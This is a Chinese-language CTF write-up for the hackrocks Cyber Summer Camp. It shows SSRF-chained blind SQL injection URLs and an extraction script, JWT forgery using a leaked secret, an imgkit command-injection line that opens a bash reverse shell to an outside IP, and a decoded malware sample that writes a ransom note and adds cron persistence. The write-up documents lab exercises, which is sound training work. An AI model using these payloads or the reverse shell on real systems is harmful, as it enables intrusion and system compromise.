# hackrocks Cyber Summer Camp CTF

###### tags: `CTF`

打不出來 QQ 好難
明天再戰一天QQ

## Arith

爆破腳本:
```python=
import os
import subprocess

host = "challenges.hackrocks.com"
port = 4747

for i in range(151):
    try:
        ret = subprocess.run(["nc", f"{host}", f"{port}"], input=f'103\n{i}\n', encoding='ascii', timeout=10, capture_output=True)
        #print('not', i)
    except subprocess.TimeoutExpired:
        print('found', i)
        break
```

每次可爆破當前一層的數字，只要在爆破完後修改第 9 行的 input，加入當層的數字 + `\n` 即可繼續爆破下一層 (除了最後一層)

最後一層的爆破腳本:
```python=
import os
import subprocess

host = "challenges.hackrocks.com"
port = 4747

for i in range(151):
    ret = subprocess.run(["nc", f"{host}", f"{port}"],
        input=f'103\n109\n98\n104\n124\n37\n86\n67\n54\n56\n50\n85\n118\n85\n52\n96\n99\n122\n96\n49\n111\n52\n{i}\n',
        encoding='ascii', capture_output=True)
    if("22 correct" in ret.stdout):
        print('found', i)
        print(ret.stdout)
```

爆破出來的數字:

```
103 109 98 104 124
37 86 67 54 56
50 85 118 85 52
96 99 122 96 49
111 52 126
```

爆破後的訊息:

![](https://i.imgur.com/uZ4Xtyl.png)

推測 flag 與數字有關且可能是 ASCII，嘗試進行解密

```
raw = 103 109 98 104 124 37 86 67 54 56 50 85 118 85 52 96 99 122 96 49 111 52 126

ascii = gmbh|%VC682UvU4`cz`1o4~
```

解密結果看不出所以然，但從 `flag{` 格式及題目的 `Arith` (Arithmetic) 通靈出以上數字需要做一次減 1，得到以下字串

```
row = 102 108 97 103 123 36 85 66 53 55 49 84 117 84 51 95 98 121 95 48 110 51 125

ascii = flag{$UB571TuT3_by_0n3}
```

得到 flag

## Insoweb
題目給了一個網址，打開後如下
![](https://i.imgur.com/RSN9XEd.png)

可以看到主要有 4 個輸入框，但經實測僅有 website 有用
且 GET 會有 4 個 parameter: `fullname`, `email`, `website`, `status`
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&website=a&status=1

此外，使用 dirsearch 掃到了神秘的 `admin.php`
![](https://i.imgur.com/dBlGp1u.png)
http://challenges.hackrocks.com:7878/admin.php

但是打開後，發現有 `outsider are not allowed!` 錯誤
![](https://i.imgur.com/620yvi3.png)
推測此題可能為 XSS 或 SSRF

在 XSS 的嘗試中，嘗試自己架設伺服器並用 XmlHTTPRequest 或其他方法偷取 admin.php 內容，但發現有 CORS 防護，無法直接偷取
![](https://i.imgur.com/g0vF9QB.png)

使用提示
![](https://i.imgur.com/Hj6qzY2.png)

根據提示，可以嘗試將 GET 參數中的 `status` 改成 0

經實測，可以在此處做 ssrf，以下為讀取 `127.0.0.1` 中的首頁
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&website=http://127.0.0.1/&status=0
![](https://i.imgur.com/f4Ka5sY.png)

讀取 admin.php
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&website=http://127.0.0.1/admin.php&status=0
![](https://i.imgur.com/crtfru5.png)

發現少了 id parameter，嘗試補上
這邊先試試看補 0
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&status=0&website=http://127.0.0.1/admin.php?id=0
![](https://i.imgur.com/gdS3egr.png)
`data not available`

而經過一些嘗試，發現當 id 為 2 時會出現不一樣的 `data is available`
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&status=0&website=http://127.0.0.1/admin.php?id=2
![](https://i.imgur.com/lL2dTJZ.png)

而當 id 為文字時，會出現 `mysql db error`，推測這邊是有 SQL injection 的問題
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&status=0&website=http://127.0.0.1/admin.php?id=a
![](https://i.imgur.com/qjFAm26.png)

而當其中有 `(空白)` 時，會出現 `400 Bad Request` 的問題
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&status=0&website=http://127.0.0.1/admin.php?id=0%20and%20true
![](https://i.imgur.com/O1AGzCh.png)

因為輸出只會有 `data not available` 或 `data is available` 二種，不會直接輸出資料，所以算是一種 `bind sql injection`

而 sql injection 中 `(空白)` 的問題，可以使用 `/**/` 來代替 (MySQL 的 feature)

首先使用 union select，找出現在欄位的長度，發現只有一個欄位，且欄位為 int
```!
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&status=0&website=http://127.0.0.1/admin.php?id=0/**/union/**/select/**/null
```
![](https://i.imgur.com/lL2dTJZ.png)
```!
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&status=0&website=http://127.0.0.1/admin.php?id=0/**/union/**/select/**/null,null
```
![](https://i.imgur.com/qjFAm26.png)
```!
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&status=0&website=http://127.0.0.1/admin.php?id=0/**/union/**/select/**/1
```
![](https://i.imgur.com/lL2dTJZ.png)
```!
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&status=0&website=http://127.0.0.1/admin.php?id=0/**/union/**/select/**/a
```
![](https://i.imgur.com/qjFAm26.png)

且通靈出現在的 table name 為 `user`
```!
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&status=0&website=http://127.0.0.1/admin.php?id=0/**/union/**/select/**/1/**/from/**/user
```
![](https://i.imgur.com/lL2dTJZ.png)

而也找到一個 table 叫做 `flag`
```!
http://challenges.hackrocks.com:7878/form.php?fullname=a&email=a&status=0&website=http://127.0.0.1/admin.php?id=0/**/union/**/select/**/1/**/from/**/flag
```
![](https://i.imgur.com/lL2dTJZ.png)

而欄位名稱無法通靈出，所以使用 error based 來找
首先先找出欄位的長度
```!
http://challenges.hackrocks.com:7878/form.php?fullname=admin&email=a&status=0&website=http://127.0.0.1/admin.php?id=0/**/union/**/select/**/1/**/from/**/information_schema.columns/**/where/**/table_name=%22flag%22/**/and/**/1/(length(column_name)>8)
```
原理是利用 where 條件中的 `1/(length(column_name)>8)`，當 `column_name` 的長度 > 8 時，會回傳 true 也就是 1，而 1/1 為 1 也為 true；而當長度 <= 8 時，會回傳 false (0)，而 1/0 就會有 error，此時就會看當前伺服器對其怎麼處理

而在此題，正常時會輸出 `data is available`，而不正常時會輸出 `data not available`

因此，可以透過慢慢修改條件的方式，找出 flag table 的 column 長度為 8

而知道長度後，一樣可以利用 error based 的方法找出名稱，如下
```!
http://challenges.hackrocks.com:7878/form.php?fullname=admin&email=a&status=0&website=http://127.0.0.1/admin.php?id=0/**/union/**/select/**/1/**/from/**/information_schema.columns/**/where/**/table_name="flag"/**/and/**/1/(substr(column_name,1,1)>'0')
```

可以慢慢找出 column name 為 `The_flag`

因此可以依樣畫葫蘆，找出 `The_flag` 的內容

首先先找出內文長度
```!
http://challenges.hackrocks.com:7878/form.php?fullname=admin&email=a&status=0&website=http://127.0.0.1/admin.php?id=0/**/union/**/select/**/1/**/from/**/flag/**/where/**/1/(length(The_flag)=43)
```

長度為 43

而由於長度很長，用手動試的方法太花費時間，因此內文部份我們使用腳本的方式慢慢破解，腳本如下:
```python=
import requests
url = 'http://challenges.hackrocks.com:7878/form.php?fullname=admin&email=a&status=0&website=http://127.0.0.1/admin.php?id=0/**/union/**/select/**/1/**/from/**/flag/**/where/**/1/(ascii(substr(The_flag,'

total_str = ""

for i in range(1, 44):
    front = 0
    end = 127
    while(front < end):
        mid = (front + end) // 2
        j = mid
        payload = f"{i},1))>{j})"
        x = requests.get(url+payload)
        if('is' in x.text):
            front = mid + 1
        else:
            payload = f"{i},1))={j})"
            x = requests.post(url+payload)
            if('is' in x.text):
                front = mid
                break
            else:
                end = mid-1
                #print(url+payload)

    print(i, chr(front))
    total_str += chr(front)
    if(front >= 128 or front < 0):
        print(f" No symble at {i}")


print("\n\n", total_str)
```

這邊因為一些關係，要將 substr 的結果用 ascii 的方式來做比較

執行結果:
![](https://i.imgur.com/BJBMwDY.png)

flag{Inj3ct10n_thr0ugh_ssrf_is_n1c3333E3E3}

## (未完成) Krock Two

## ACE-ng

在 binary 中可看到奇怪的 pydata 資料

![](https://i.imgur.com/SgWrQdg.png)

參考 [這篇文章](https://www.fortinet.com/blog/threat-research/unpacking-python-executables-windows-linux) 發現可能是 pyinstaller 的 python data，且題目也寫明是使用 python 3.7.0 產生的

且在 defined string 中可找到 `MEIPASS` 字樣，確認是使用 pyinstaller

![](https://i.imgur.com/PY3ay8L.png)

將 pydata 萃取後資料如下:

[pydata.dump](https://drive.google.com/file/d/1qfwkuvalMASyqHfHuVbXXo9II2OjCU_x/view?usp=sharing)

使用 [pyinstxtractor](https://github.com/extremecoders-re/pyinstxtractor) 來提取資料，可看到其中有一個可疑檔案 `extracted_malware.pyc`

![](https://i.imgur.com/cZqgpE7.png)

此時嘗試使用 [uncompyle6](https://github.com/rocky/python-uncompyle6) 反編譯此檔案，但無法成功

後直接使用 xxd，看到其中有奇怪的數字資料

使用 strings 將其內容取出

![](https://i.imgur.com/W3zHsjo.png)


推測使用 ascii，嘗試進行解析，第一次解析結果如下:

```!
23696d706f7274206374797065730a696d706f72742073756270726f636573730a64656620656e637279707428706c61696e293a0a097472793a0a0909696d706f72742043727970746f646f6d652e4369706865722e414553206173206165730a0909696d706f7274206261736536340a0909636970686572203d206165732e6e6577286222766572796c6f6e676c6f6e676b657979222c206165732e4d4f44455f4346422c2069763d62223132333435363738393039383736353422290a090963697068657265645f64617461203d206369706865722e656e637279707428706c61696e2e656e636f64652829290a09097072696e74286261736536342e623634656e636f64652863697068657265645f6461746129290a096578636570743a0a09097072696e7428225b2d5d204572726f7222290a0a646566206d61696e28293a0a0977697468206f70656e28222f7661722f6d6573736167652e747874222c2022772229206173206b3a0a09096b2e77726974652822222250574e454420414e4420484552452753204d592042544320414444524553533a20316a396b4b4d6a5a6d372b314541416f397a366666316131754d67716152677273673d3d222222290a0977697468206f70656e28222f7661722f68696464656e2e7368222c202277222920617320643a0a0909642e7772697465282277616c6c202d6e202428636174206d6573736167652e7478742922290a0965786574203d2073756270726f636573732e6765746f757470757428622263686d6f6420373737202f7661722f68696464656e2e73683b206563686f20272a2f35202a202a202a202a202f62696e2f62617368202f726f6f742f68696464656e2e736827207c2063726f6e746162202d22290a0923636f6d2e6576696c286374797065732e635f636861725f7028622269642229290a0977697468206f70656e2822726561646d652e747874222c202277222920617320663a0a0909662e7772697465282250574e454420414e4420504552534953544544203e3a2922290a097072696e7428223e3a2922290a0a6966205f5f6e616d655f5f203d3d20275f5f6d61696e5f5f273a0a096d61696e28290a
```

可以看到仍是亂碼，但嘗試再進行一次 ascii 解析後，發現似乎是原始碼

```python=
#import ctypes
import subprocess
def encrypt(plain):
	try:
		import Cryptodome.Cipher.AES as aes
		import base64
		cipher = aes.new(b"verylonglongkeyy", aes.MODE_CFB, iv=b"1234567890987654")
		ciphered_data = cipher.encrypt(plain.encode())
		print(base64.b64encode(ciphered_data))
	except:
		print("[-] Error")

def main():
	with open("/var/message.txt", "w") as k:
		k.write("""PWNED AND HERE'S MY BTC ADDRESS: 1j9kKMjZm7+1EAAo9z6ff1a1uMgqaRgrsg==""")
	with open("/var/hidden.sh", "w") as d:
		d.write("wall -n $(cat message.txt)")
	exet = subprocess.getoutput(b"chmod 777 /var/hidden.sh; echo '*/5 * * * * /bin/bash /root/hidden.sh' | crontab -")
	#com.evil(ctypes.c_char_p(b"id"))
	with open("readme.txt", "w") as f:
		f.write("PWNED AND PERSISTED >:)")
	print(">:)")

if __name__ == '__main__':
	main()
```

其中的 BTC Address 看起來很像 base64 的字串，嘗試使用 base64 decode

![](https://i.imgur.com/gbaDG05.png)

decode 出來的字串很詭異，推測還需要做其他動作

再觀察程式碼，可以看到其中有一個沒有用到的 encrypt 函數，且在最後有做 base64 的 encode，推測這個地址是用這個函數產生出來的，嘗試進行解密

解密函式:

```python=
import Crypto.Cipher.AES as aes
import base64

cipher = aes.new(b"verylonglongkeyy", aes.MODE_CFB, iv=b"1234567890987654")

ciphered_data = base64.b64decode("1j9kKMjZm7+1EAAo9z6ff1a1uMgqaRgrsg==")
print(ciphered_data)

plain_data = cipher.decrypt(ciphered_data)

print(plain_data)
```

解密出來的是這題的 flag

b'flag{C0mpL1c4t3d_m4Lw4r3}'

## Screamshot

剛進入題目給的網址，發現是一個登入介面，嘗試使用 sqli 等方式皆無法直接突破保護
![](https://i.imgur.com/283XGxG.png)

只好先暫時正常註冊帳號

帳號密碼 email 等皆設為 `a`

登入後發現可以使用 `/home`, `/user` 等路徑，但是 `/admin` 無法，推測需要進一步提權

![](https://i.imgur.com/sl2qasU.png)

觀察後發現認證方式是使用名稱為 `x-access-token` 的 JWT
![](https://i.imgur.com/L7YQj47.png)
裡面存放使用者的帳號及 expiration date (UNIX time)，但經過一番嘗試找不到騙過 JWT 的方法

後來開了一個提示
![](https://i.imgur.com/UCcOG6o.png)

發現存在 `/.env` 路徑
http://challenges.hackrocks.com:9998/.env
![](https://i.imgur.com/NdMtdoA.png)
裡面為 JWT 的 secret key

![](https://i.imgur.com/JeKlkfV.png)
驗證通過

竄改身分為 `admin`，expiration date 改為一個月後的時間
![](https://i.imgur.com/HLGPe5L.png)

```!
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwdWJsaWNfaWQiOiJhZG1pbiIsImV4cCI6MTY2MzkyNzY0N30.MJ1pDsuSc1KZVXciptw_nYHmsm8_aOGj9zusvQlCzfs
```

順利獲得 admin 身分
![](https://i.imgur.com/gX2DwJb.png)

`/admin` 應該是一個下載圖片的路徑，使用 imgkit
![](https://i.imgur.com/CyQhwpO.png)

在給的附檔中，`feature-panel.py` 存在特別的註解
```python=
# RCE
    if len(data.get('wkhtmltoimage')) > 2:
        print("1")
        param = data.get('wkhtmltoimage')
        print(param)
        try:
            config = imgkit.config(wkhtmltoimage=param)
            imgkit.from_url(uri, str('./static/'+output), config=config)
        except Exception as e:
            err_ret = str(e)
            bool_hid = "true"
            status_to_ret = ""
        # RCE END
```

而提示也提到了這一部分
![](https://i.imgur.com/QA07UOJ.png)

後來在 github issue 看到有相關的漏洞 (**且在目前版本中未修**)，可以達到 RCE
https://github.com/jarrekk/imgkit/issues/81
![](https://i.imgur.com/aTjlh2n.png)

在本機上也能達成
![](https://i.imgur.com/ywz0i2D.png)

而至於程式碼中的 `str('./static/'+output)` 部分，可以使用 path traversal 繞過
![](https://i.imgur.com/SdYCjrW.png)

為了能進行更方便的控制，這邊我們使用 reverse shell

URL: `-c`
output: `../../../../../../../../../../bin/bash -i >& /dev/tcp/159.65.7.206/2022 0>& 1`
config path: `/bin/bash`

![](https://i.imgur.com/XU0dQQd.png)
確實拿到了 shell

在路徑下，也看到了神祕的 `flag.txt`

打開後就是 flag
![](https://i.imgur.com/h6AjDyP.png)

flag{pwn_jwt_4nd_blindly_pwn_the_ISSu3_81}

## amAPT
打開 pcap 後，先進行 protocol hierarchy 分析 (Statistics > Protocol Hierarchy)

![](https://i.imgur.com/UKWCNXt.png)

可以看到裡面有 HTTP 和 SSH 相關的連線

在 HTTP 中，僅有 2 筆連線
![](https://i.imgur.com/WqxcZ7A.png)

在 GET /stashed.bin 連線中，可以看到其向 ngrok.io 的其中一個 instance 進行連線，推測是 C2 server
![](https://i.imgur.com/ABL3LRf.png)

而回應資料收到了奇怪的資訊，而其中有可疑的 stolen/flag.txt 文字
![](https://i.imgur.com/0fYumRQ.png)

且可以看到，裡面有 `PK` 字樣，印象中為檔案的 file signature

想辦法將其複製並填入到檔案中，使用 binwalk 發現其實裡面包著 zip 資料
![](https://i.imgur.com/gq88eyF.png)

使用 `binwalk -e` 提取出來後的檔案路徑如下:
```
.
├── 20.zip
└── stolen
    └── flag.txt
```

嘗試讀取 flag.txt，但發現檔案是空的
![](https://i.imgur.com/tTD0TbJ.png)

後來嘗試解開 20.zip，發現這個才是真實的 flag.txt 檔案，且需要密碼

![](https://i.imgur.com/XgVbnSk.png)

回到 pcap 找密碼，剛才檢查了 HTTP，接著檢查一下 SSH 資訊

![](https://i.imgur.com/4nnaijU.png)

可以看到大部分的 SSH 連線是與 103.152.118.120 和 182.3.38.14 這兩個 IP 有關，而根據上方 HTTP 資訊，可以推測 103.152.118.120 為受害者的 IP，而控制者為 182.3.38.14

進行 `ip.addr==182.3.38.14` 的 filter 後嘗試進行 Protocol Hierarchy 分析，發現有未加密的 TCP data 區段

![](https://i.imgur.com/JybYe9X.png)

進行 `ip.addr==182.3.38.14 and data` filter，發現僅剩下 13 筆紀錄

![](https://i.imgur.com/w5hlsOw.png)

第一筆紀錄的 data 為 `password:`
![](https://i.imgur.com/OVwbwa0.png)

第二筆則為 `superstr0ngp4ssw0rd`
![](https://i.imgur.com/AtYxowP.png)

推測 zip 的密碼是這個

![](https://i.imgur.com/MSwub7B.png)

測試確實能解開

解開後拿到 flag
![](https://i.imgur.com/UcMDImM.png)

flag{c0rrupt3d_zip_4nd_extr4cted_m4lware}